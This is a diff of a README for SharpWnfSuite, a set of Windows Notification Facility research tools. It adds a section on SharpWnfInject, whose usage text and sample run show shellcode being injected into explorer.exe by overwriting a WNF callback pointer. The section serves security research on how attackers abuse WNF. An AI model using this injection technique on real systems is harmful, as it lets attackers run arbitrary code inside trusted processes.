@@ -12,11 +12,17 @@ When I develop additional tools for Windows Notification Facility, they will be 
         + [SharpWnfClient](#sharpwnfclient)
         + [SharpWnfServer](#sharpwnfserver)
         + [SharpWnfScan](#sharpwnfscan)
+        + [SharpWnfInject](#sharpwnfinject)
     + [Reference](#reference)
     + [Acknowledgments](#acknowledgments)
 
 ## Usage
 ### SharpWnfDump
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfDump)
+
 This tool dumps or manipulate information about WNF State Names.
 Equivalent to [wnfdump.exe](https://github.com/ionescu007/wnfun/blob/master/wnftools_x64/wnfdump.exe) and [WnfDump.py](https://github.com/ionescu007/wnfun/blob/master/script_python/WnfDump.py).
 I made some updates from the original tool (Exception Handling, Well-Known State Name and new WNF_DATA_SCOPE member).
@@ -159,6 +165,11 @@ WNF_SHEL_APPRESOLVER_SCAN:
 
 
 ### SharpWnfNameDumper
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfNameDumper)
+
 This tool dumps Well-Known State Name from DLL (typically perf_nt_c.dll).
 Equivalent to [WnfNameDumper.py](https://github.com/ionescu007/wnfun/blob/master/script_python/WnfNameDumper.py).
 
@@ -247,7 +258,13 @@ public enum WELL_KNOWN_WNF_NAME : ulong
 }
 ```
 
+
 ### SharpWnfClient
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfClient)
+
 This is a tool for a subscribe WNF State Name.
 Equivalent to [wnfclient-rtl.exe](https://github.com/ionescu007/wnfun/blob/master/wnftools_x64/wnfclient-rtl.exe) and [WnfClientServer.py](https://github.com/ionescu007/wnfun/blob/master/script_python/WnfClientServer.py).
 
@@ -285,6 +302,11 @@ Then, if you start Slack application, should see following result:
 
 
 ### SharpWnfServer
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfServer)
+
 This tool creates a temporary lifetime WNF State Name and sends some message to the subscriber.
 Equivalent to [wnfserver.exe](https://github.com/ionescu007/wnfun/blob/master/wnftools_x64/wnfserver.exe) and [WnfClientServer.py](https://github.com/ionescu007/wnfun/blob/master/script_python/WnfClientServer.py).
 
@@ -339,6 +361,11 @@ Then, you should see the message in the terminal for `SharpWnfClient.exe` as fol
 
 
 ### SharpWnfScan
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfScan)
+
 This tool is based on [modexp](https://twitter.com/modexpblog)'s [wnfscan](https://github.com/odzhan/injection/blob/master/wnf/wnfscan.c), and dumps WNF subscription information from process.
 
 ```
@@ -510,13 +537,85 @@ WNF_SUBSCRIPTION_TABLE @ 0x0000022C22A13B30
 ```
 
 
+### SharpWnfInject
+
+[Back to Top](#sharpwnfsuite)
+
+[Project](./SharpWnfSuite/SharpWnfInject)
+
+This tool is to investigate how attackers can abuse WNF for code injection technique:
+
+```
+C:\dev>SharpWnfInject.exe -h
+
+SharpWnfInject - Tool to investigate WNF code injection technique.
+
+Usage: SharpWnfInject.exe [Options]
+
+        -h, --help  : Displays this help message.
+        -n, --name  : Specifies WNF State Name to inject. Hex format or Well-known name format is accepted.
+        -p, --pid   : Specifies PID to inject.
+        -i, --input : Specifies the file path to shellcode.
+        -d, --debug : Flag to enable SeDebugPrivilege. Requires administrative privilege.
+```
+
+This tool overwrite callback function pointer in `WNF_USER_SUBSCRIPTION` for a specific WNF State Name.
+The code injection technique does not work for all WNF State Name.
+For example, this technique is known to be available for `WNF_SHEL_APPLICATION_STARTED` used in `explorer.exe`.
+To test this technique, execute this tool as following:
+
+```
+C:\dev>SharpWnfInject.exe -p 4040 -n WNF_SHEL_APPLICATION_STARTED -i payload.bin
+
+[>] Trying to open the target process.
+[+] Target process is opened successfully.
+    |-> Process Name : explorer.exe
+    |-> Process ID   : 4040
+    |-> Architecture : x64
+[>] Trying to get WNF_SUBSCRIPTION_TABLE.
+[+] Got valid WNF_SUBSCRIPTION_TABLE.
+    |-> Address : 0x0000000000B4BCB0
+[>] Trying to get WNF_NAME_SUBSCRIPTION(s).
+[+] Got 99 WNF_NAME_SUBSCRIPTION(s)
+[>] Searching the WNF_NAME_SUBSCRIPTION for the specified WNF State Name.
+[+] Got WNF_NAME_SUBSCRIPTION for the specified WNF State Name.
+    |-> WNF State Name : WNF_SHEL_APPLICATION_STARTED (0x0D83063EA3BE0075)
+    |-> Address        : 0x0000000007ED4640
+[>] Trying to get WNF_USER_SUBSCRIPTION(s) for the target WNF_NAME_SUBSCRIPTION.
+[+] Got 1 WNF_USER_SUBSCRIPTION(s).
+[>] Trying to inject shellccode to the following WNF_USER_SUBSCRIPTION.
+    |-> Address  : 0x00000000049A5930
+    |-> Callback : 0x00007FFE6C1DEE90 (twinui.pcshell.dll)
+[>] Trying to allocate shellcode buffer in remote process.
+[+] Shellcode buffer is allocated successfully.
+    |-> Shellcode buffer : 0x0000000000D20000
+[>] Trying to write shellcode to remote process.
+[+] Shellcode are written successfully.
+    |-> Shellcode Length : 344 byte(s)
+[>] Trying to overwrite callback function pointer.
+[+] Callback function pointer is overwritten successfully.
+[+] WNF State Data is updated successfully.
+[>] Trying to revert callback function pointer.
+[+] Callback function pointer is reverted successfully.
+[+] Code injection is completed successfully.
+```
+
+If you want to enable `SeDebugPrivilege`, set `-d` flag and execute with administrative privilege.
+
+
 ## Reference
+
+[Back to Top](#sharpwnfsuite)
+
 + [Windows Notification Facility: Peeling the Onion of the Most Undocumented Kernel Attack Surface Yet](https://www.youtube.com/watch?v=MybmgE95weo)
 + [Playing with the Windows Notification Facility (WNF)](https://blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf.html)
 + [wnfun](https://github.com/ionescu007/wnfun)
 + [Windows Process Injection : Windows Notification Facility](https://modexp.wordpress.com/2019/06/15/4083/)
 
 ## Acknowledgments
+
+[Back to Top](#sharpwnfsuite)
+
 Thanks for your research:
 
 + Alex Ionescu ([@aionescu](https://twitter.com/aionescu))
